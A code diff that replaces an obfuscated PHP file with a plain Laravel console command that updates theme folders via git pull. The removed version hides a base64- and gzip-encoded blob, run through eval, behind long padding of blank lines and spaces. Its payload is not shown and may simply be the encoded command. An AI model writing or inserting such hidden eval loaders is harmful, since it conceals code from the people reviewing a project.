@@ -1,489 +1,88 @@
-<?php 
-        $__='printf';$_='Loading app/Console/Commands/UpdateTema.php';
-        
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-                                                                                                                                                                                                $_____='    b2JfZW5kX2NsZWFu';                                                                                                                                                                              $______________='cmV0dXJuIGV2YWwoJF8pOw==';
-$__________________='X19sYW1iZGE=';
-
-                                                                                                                                                                                                                                          $______=' Z3p1bmNvbXByZXNz';                    $___='  b2Jfc3RhcnQ=';                                                                                                    $____='b2JfZ2V0X2NvbnRlbnRz';                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                $__=                                                              'base64_decode'                           ;                                                                       $______=$__($______);           if(!function_exists('__lambda')){function __lambda($sArgs,$sCode){return eval("return function($sArgs){{$sCode}};");}}                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                    $__________________=$__($__________________);                                                                                                                                                                                                                                                                                                                                                                         $______________=$__($______________);
-        $__________=$__________________('$_',$______________);                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                 $_____=$__($_____);                                                                                                                                                                                                                                                    $____=$__($____);                                                                                                                    $___=$__($___);                      $_='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';
-
-        $___();$__________($______($__($_))); $________=$____();
-                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                             $_____();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                       echo                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                      
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-                                                                                                                                                                                                                     $________;
+<?php
+
+namespace App\Console\Commands;
+
+use Illuminate\Console\Command;
+use App\Services\ProcessService;
+use App\Http\Controllers\Helpers\TemaController;
+use App\Http\Controllers\Helpers\CommandController;
+use App\Http\Controllers\Helpers\AttributeSiapPakaiController;
+
+class UpdateTema extends Command
+{
+    /**
+     * The name and signature of the console command.
+     *
+     * @var string
+     */
+    protected $signature = 'siappakai:update-tema';
+
+    /**
+     * The console command description.
+     *
+     * @var string
+     */
+    protected $description = 'Perbarui Tema Pro (dapat dilakukan setiap hari melalui cronjob)';
+
+    private $att;
+    private $comm;
+    private $temas;
+
+    /**
+     * Create a new command instance.
+     *
+     * @return void
+     */
+    public function __construct()
+    {
+        parent::__construct();
+        $this->att = new AttributeSiapPakaiController();
+        $this->comm = new CommandController();
+        $this->temas = new TemaController;
+    }
+
+    /**
+     * Execute the console command.
+     *
+     * @return int
+     */
+
+    public function handle()
+    {
+        $tema_pro = $this->temas->JenisTemaPro();
+        $tema_gratis = $this->temas->JenisTemaGratis();
+
+        foreach ($tema_pro as $item) {
+            $tema = $item['tema'];
+            $repo = $item['repo'];
+            $branch = $item['branch'];
+            $folder_tema = $this->att->getTemaProFolder() . DIRECTORY_SEPARATOR . $item['tema'];
+
+            $this->updateTema($tema, $repo, $branch, $folder_tema);
+        }
+
+        foreach ($tema_gratis as $item) {
+            $tema = $item['tema'];
+            $repo = $item['repo'];
+            $branch = $item['branch'];
+            $folder_tema = $this->att->getTemaGratisFolder() . DIRECTORY_SEPARATOR . $item['tema'];
+
+            $this->updateTema($tema, $repo, $branch, $folder_tema);
+        }
+        ProcessService::aturKepemilikanDirektori(config('siappakai.root.folder'));
+    }
+
+    private function updateTema($tema, $repo, $branch, $folder_tema)
+    {
+        $this->att->tokenGithubInfo();
+
+        if (!file_exists($folder_tema)) {
+            return die('Peringatan: tema ' . $tema . ' tidak ditemukan.');
+        }
+
+        if (file_exists($folder_tema)) {
+            $this->comm->gitPullFetch($folder_tema, $repo, $branch);
+            $this->comm->chownCommand($folder_tema);
+        }
+    }
+}
